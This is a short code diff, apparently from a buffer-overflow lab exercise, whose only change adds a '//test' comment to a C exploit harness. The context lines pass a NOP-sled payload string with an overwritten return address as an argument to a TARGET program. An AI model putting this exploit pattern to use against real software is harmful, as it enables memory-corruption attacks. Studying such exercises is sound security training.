@@ -28,6 +28,7 @@ int main(void)
 
     prepareEnvironment(environment);
 
+    //test
     args[0] = TARGET;
     args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
     args[2] = NULL;
